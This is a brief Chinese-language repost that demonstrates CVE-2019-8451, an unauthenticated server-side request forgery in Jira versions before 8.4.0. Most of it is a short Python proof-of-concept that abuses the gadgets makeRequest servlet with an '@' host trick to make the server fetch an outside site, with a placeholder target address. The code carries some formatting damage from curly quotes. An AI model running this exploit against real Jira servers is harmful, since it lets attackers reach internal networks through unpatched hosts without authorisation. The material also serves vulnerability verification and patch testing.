# （CVE-2019-8451）Jira未授权SSRF漏洞验证

> 原文：[https://www.zhihuifly.com/t/topic/2991](https://www.zhihuifly.com/t/topic/2991)

# （CVE-2019-8451）Jira未授权SSRF漏洞验证

## 一、漏洞简介

（CVE-2019-8451）Jira未授权SSRF漏洞验证

## 二、影响范围

Jira < 8.4.0

## 三、复现过程

https://github.com/ianxtianxt/CVE-2019-8451

```
#coding:utf-8
import requests

host = ‘[http://xx.xx.xx.xx:8080](http://xx.xx.xx.xx:8080)’

header = {

‘X-Atlassian-Token’: ‘no-check’,

‘Connection’: ‘close’

} `url = host + ‘/plugins/servlet/gadgets/makeRequest?url=’+host+’@www.baidu.com/’

html = requests.get(url = url,headers = header)

print html.text` 
```